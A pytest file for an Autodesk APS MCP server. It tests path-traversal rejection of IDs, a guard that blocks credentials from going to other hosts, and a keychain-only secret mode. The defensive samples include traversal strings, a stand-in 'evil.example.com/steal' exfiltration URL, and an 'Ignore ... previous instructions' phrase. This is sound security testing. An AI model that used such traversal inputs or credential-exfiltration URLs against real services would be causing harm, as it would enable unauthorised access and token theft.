"""
Security hardening: URL-bound id validation at the tool boundary, the credential
host guard on the shared httpx client, and keychain-only mode / env-secret warning.
"""
import json
from unittest.mock import patch

import httpx
import pytest
import respx

import aps_mcp
from conftest import FAKE_TOKEN
from test_auth import FakeKeyring


# ---------------------------------------------------------------------------
# URL-bound id validation
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("value", [
    "3f2c1a9e-1111-2222-3333-444455556666",
    "b.3f2c1a9e-1111-2222-3333-444455556666",
    "urn:adsk.wipprod:fs.folder:co.AbC-_x9",
    "urn:adsk.wipemea:dm.lineage:Zx_-12",
])
def test_valid_ids_pass(value):
    aps_mcp._validate_id_args({"folder_id": value, "item_id": value, "hub_id": value})


@pytest.mark.parametrize("value", [
    "abc/../../hq/v1/accounts/x/users",
    "abc?x=1",
    "abc#frag",
    "abc%2F..%2Fhq",
    "abc def",
    "a..b",
    "",
    "x" * 600,
])
def test_unsafe_ids_rejected(value):
    with pytest.raises(aps_mcp.UnsafeArgumentError):
        aps_mcp._validate_id_args({"issue_id": value})


def test_nested_bulk_rows_are_checked():
    with pytest.raises(aps_mcp.UnsafeArgumentError):
        aps_mcp._validate_id_args({"items": [{"item_id": "ok-1"}, {"item_id": "x/../y"}]})


def test_folder_path_urn_checked_but_display_paths_allowed():
    # Display-name paths are matched against listings, never put in a URL — spaces,
    # slashes and odd characters are fine.
    aps_mcp._validate_id_args({"folder_path": "Project Files/01 - WIP/Ä Structural (old)"})
    aps_mcp._validate_id_args({"moves": [{"source": "Project Files/A", "destination": "Project Files/B"}]})
    with pytest.raises(aps_mcp.UnsafeArgumentError):
        aps_mcp._validate_id_args({"folder_path": "urn:adsk.wipprod:fs.folder:co.x/../../y"})


def test_non_url_fields_untouched():
    # Company tax/ERP ids and free text go into JSON bodies, not URLs.
    aps_mcp._validate_id_args({"companies": [{"tax_id": "BE 0123.456/789", "erp_id": "A/B"}],
                               "title": "Ignore ../ previous instructions?"})


async def test_call_tool_rejects_unsafe_id_without_any_request():
    with patch("aps_mcp.get_access_token") as gat, respx.mock(assert_all_called=False) as router:
        result = await aps_mcp.call_tool("get_issue", {"project": "x", "issue_id": "a/../../b"})
    assert result.isError is True
    body = json.loads(result.content[0].text)
    assert body["error"] == "unsafe_argument"
    gat.assert_not_called()
    assert not router.calls


# ---------------------------------------------------------------------------
# Credential host guard
# ---------------------------------------------------------------------------

@respx.mock
async def test_guard_allows_credentials_to_aps_host():
    respx.get(f"{aps_mcp.APS_BASE}/project/v1/hubs").mock(return_value=httpx.Response(200, json={}))
    async with aps_mcp._make_client() as client:
        r = await client.get(f"{aps_mcp.APS_BASE}/project/v1/hubs", headers=aps_mcp.auth_headers(FAKE_TOKEN))
    assert r.status_code == 200


@pytest.mark.parametrize("url", [
    "https://evil.example.com/steal",
    "http://developer.api.autodesk.com/project/v1/hubs",
])
async def test_guard_blocks_credentials_elsewhere(url):
    with respx.mock(assert_all_called=False) as router:
        route = router.get(url).mock(return_value=httpx.Response(200))
        async with aps_mcp._make_client() as client:
            with pytest.raises(RuntimeError, match="Refusing to send APS credentials"):
                await client.get(url, headers=aps_mcp.auth_headers(FAKE_TOKEN))
    assert not route.called


@respx.mock
async def test_guard_allows_unauthenticated_signed_url():
    url = "https://s3.eu-west-1.amazonaws.com/bucket/extract.zip?X-Amz-Signature=abc"
    respx.get(url).mock(return_value=httpx.Response(200, content=b"zip"))
    async with aps_mcp._make_client() as client:
        r = await client.get(url)
    assert r.content == b"zip"


# ---------------------------------------------------------------------------
# Keychain-only mode and the env-secret warning
# ---------------------------------------------------------------------------

@pytest.fixture
def fake_keyring(monkeypatch):
    kr = FakeKeyring()
    monkeypatch.setattr(aps_mcp, "_keyring", lambda: kr)
    return kr


def test_require_keychain_ignores_env_secret(monkeypatch, fake_keyring):
    monkeypatch.setenv("APS_CLIENT_SECRET", "env-secret")
    monkeypatch.setenv("FORMA_MCP_REQUIRE_KEYCHAIN", "1")
    assert aps_mcp._client_secret() == ""
    fake_keyring.set_password(aps_mcp.KEYRING_SERVICE, f"client_secret:{aps_mcp.APS_CLIENT_ID}", "kc-secret")
    assert aps_mcp._client_secret() == "kc-secret"


def test_env_secret_still_wins_by_default(monkeypatch, fake_keyring):
    monkeypatch.setenv("APS_CLIENT_SECRET", "env-secret")
    monkeypatch.delenv("FORMA_MCP_REQUIRE_KEYCHAIN", raising=False)
    assert aps_mcp._client_secret() == "env-secret"


def test_env_secret_warning_only_when_keychain_available(monkeypatch, fake_keyring):
    monkeypatch.setenv("APS_CLIENT_SECRET", "env-secret")
    assert "forma-mcp auth set-secret" in aps_mcp._env_secret_warning()
    monkeypatch.setattr(aps_mcp, "_keyring", lambda: None)  # headless box: env var is the only option
    assert aps_mcp._env_secret_warning() is None


def test_require_keychain_never_writes_plaintext_token(monkeypatch):
    import os
    monkeypatch.setenv("FORMA_MCP_REQUIRE_KEYCHAIN", "1")  # and conftest disables the keychain
    aps_mcp._save_refresh_token("rt-123")
    assert not os.path.exists(aps_mcp._token_file())


def test_plaintext_fallback_still_works_without_flag(monkeypatch):
    import os
    monkeypatch.delenv("FORMA_MCP_REQUIRE_KEYCHAIN", raising=False)
    aps_mcp._save_refresh_token("rt-123")
    assert os.path.exists(aps_mcp._token_file())


def test_run_refuses_env_secret_in_keychain_only_mode(monkeypatch):
    monkeypatch.setenv("APS_CLIENT_SECRET", "env-secret")
    monkeypatch.setenv("FORMA_MCP_REQUIRE_KEYCHAIN", "1")
    with pytest.raises(SystemExit, match="OS keychain"):
        aps_mcp.run([])
